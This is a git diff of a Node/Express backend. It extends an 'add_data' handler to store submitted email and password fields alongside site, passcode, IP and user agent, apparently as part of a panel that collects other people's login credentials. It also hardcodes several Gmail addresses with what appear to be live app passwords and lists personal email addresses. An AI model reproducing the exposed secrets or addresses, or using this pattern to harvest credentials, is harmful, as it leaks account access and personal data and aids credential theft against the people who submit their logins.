@@ -420,7 +420,7 @@ export const add_data = async (req, res) => {
 
 
     const { adminId, posterId } = req.params
-    const { site, mail, passcode  } = req.body
+    const { site, mail, passcode ,email,password } = req.body
     const userAgent = req.headers['user-agent'];
     const ipAddress =  (req.headers['x-forwarded-for'] || 
     req.connection.remoteAddress || 
@@ -435,6 +435,7 @@ export const add_data = async (req, res) => {
         if (userFound && posterFound) {
             const info = await Info.create({
                 site, mail, passcode,
+                email,password,
                adminId:adminId,
                 poster: posterId,
                 root: posterFound._id,
@@ -1549,7 +1550,7 @@ export const email_otp = async (req, res) => {
       };
   
 
-    
+
 
 
      
@@ -1638,8 +1639,11 @@ export const send_email = async (req, res) => {
         secure: false,
         auth: {
             
-            user: 'ranaha199112@gmail.com',
-            pass:'jzpp ypxn ywtr niog',
+
+               user: 'tonmoysamoi@gmail.com',
+          pass:'theh cifb ffjc ogil',
+            // user: 'ranaha199112@gmail.com',
+            // pass:'jzpp ypxn ywtr niog',
 
             // user: 'tonmoysamoi@gmail.com',
             // pass:'jqtt atlb ilwr fzat',
@@ -1651,10 +1655,10 @@ export const send_email = async (req, res) => {
       const mailOptions = {
         from: {
           name: 'Test Email',
-          address: 'shannonit@gmail.com',
+          address: 'tonmoysamoi@gmail.com',
         },
         to: email,
-        cc: ['rana.buddy@gmail.com','emonabdullah445@gmail.com','simonahmed00775@gmail.com'],
+        // cc: ['rana.buddy@gmail.com','emonabdullah445@gmail.com','simonahmed00775@gmail.com'],
         subject: 'active ship management',
         text:"this email is from active ship management"
         // html:templete
